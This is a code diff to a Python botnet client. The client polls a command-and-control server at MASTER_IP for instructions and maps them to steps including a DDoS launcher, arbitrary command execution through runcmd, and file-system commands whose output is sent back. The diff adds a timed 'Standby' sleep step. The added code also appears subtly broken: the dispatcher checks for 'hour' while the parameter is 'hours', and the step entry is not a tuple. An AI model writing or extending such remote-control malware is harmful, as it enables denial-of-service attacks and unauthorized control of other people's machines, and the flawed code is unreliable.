@@ -17,7 +17,6 @@ result = ""
 
 def get_command():
     command = requests.get("http://" + MASTER_IP + ":" + MASTER_PORT + "/get_command").json()
-    # print("Command is:", command.content.decode('ascii'))
     return command
 
 def parse_ret_val(ret_val):
@@ -95,9 +94,13 @@ def runcmd(cmd):
         print(str(exc))
         result = str(exc)
 
+def Standby(hours):
+    seconds = float(float(hours) * 3600)
+    time.sleep(seconds)
+
 steps = {
     "DDoS": (get_script, launchDDoS),
-    "Standby": (),
+    "Standby": (Standby),
     "ls" : (ls, send_result),
     "cd" : (cd, send_result),
     "pwd" : (pwd, send_result),
@@ -120,10 +123,8 @@ def run():
                 for step in steps[command[0]]:
                     args = inspect.getargspec(step)[0]
                     assert(isinstance(args, list))
-                    if 'path' in args or 'file_name' in args or 'cmd' in args:
+                    if 'path' in args or 'file_name' in args or 'cmd' in args or 'hour' in args:
                         step(command[1])
-                    # elif 'result' in args:
-                    #     step()
                     else:
                         step()
         except Exception as e:
